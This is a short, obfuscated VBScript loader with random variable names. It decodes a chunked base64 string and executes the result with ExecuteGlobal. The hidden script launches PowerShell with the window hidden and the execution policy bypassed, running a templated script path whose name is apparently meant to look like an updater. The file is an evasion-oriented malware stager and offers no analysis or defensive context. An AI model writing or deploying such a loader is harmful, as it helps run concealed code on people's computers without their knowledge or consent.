Dim phycvcgi
phycvcgi = ""
phycvcgi = phycvcgi & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsA"
phycvcgi = phycvcgi & "CwAIABzAEMAbQBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQ"
phycvcgi = phycvcgi & "BPAGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEM"
phycvcgi = phycvcgi & "AbQBkACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUABy"
phycvcgi = phycvcgi & "AG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBXAGkAb"
phycvcgi = phycvcgi & "gBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1AHQAaQBvAG"
phycvcgi = phycvcgi & "4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQB"
phycvcgi = phycvcgi & "QAEQAQQBUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwA"
phycvcgi = phycvcgi & "bAAuAFIAdQBuACAAcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTA"
phycvcgi = phycvcgi & "GgAZQBsAGwAIAA9ACAATgBvAHQAaABpAG4AZwA="
Dim ermdutca : Set ermdutca = CreateObject("ADODB.Stream")
ermdutca.Type = 1 : ermdutca.Open
Dim brzchwye : Set brzchwye = CreateObject("MSXml2.DOMDocument").createElement("z")
brzchwye.dataType = "bin.base64" : brzchwye.text = phycvcgi
ermdutca.Write brzchwye.nodeTypedValue
ermdutca.Position = 0 : ermdutca.Type = 2 : ermdutca.Charset = "UTF-16LE"
Dim rpxfrbmz : rpxfrbmz = ermdutca.ReadText : ermdutca.Close
ExecuteGlobal rpxfrbmz